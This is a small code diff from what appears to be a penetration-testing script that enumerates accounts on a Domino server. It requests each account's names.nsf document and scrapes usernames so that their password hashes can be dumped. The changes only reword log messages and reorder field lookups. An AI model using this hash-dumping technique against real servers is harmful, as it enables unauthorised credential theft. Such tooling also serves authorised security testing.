@@ -67,9 +67,9 @@ def enum_accounts(target, header, username, password):
 
 	if len(accounts) > 0:
 		if len(accounts) == 1:
-			utility.print_good("Found {0} account, dumping hash".format(len(accounts)))
-		elif len(accounts) > 1:
-			utility.print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
+			utility.print_good("Found {0} account, dumping account hash".format(len(accounts)))
+		else:
+			utility.print_good("Found {0} accounts, dumping accounts with hashes".format(len(accounts)))
 
 		for unid in accounts:
 			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(target, unid))
@@ -95,7 +95,7 @@ def get_domino_hash(response):
 	soup = BeautifulSoup(response.text, 'lxml')
 	try:
 		# Get account username
-		username_params = ['$dspFullName', '$dspShortName']
+		username_params = ['$dspShortName', '$dspFullName']
 		for user_param in username_params:
 			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
 			if len(domino_username) > 0:
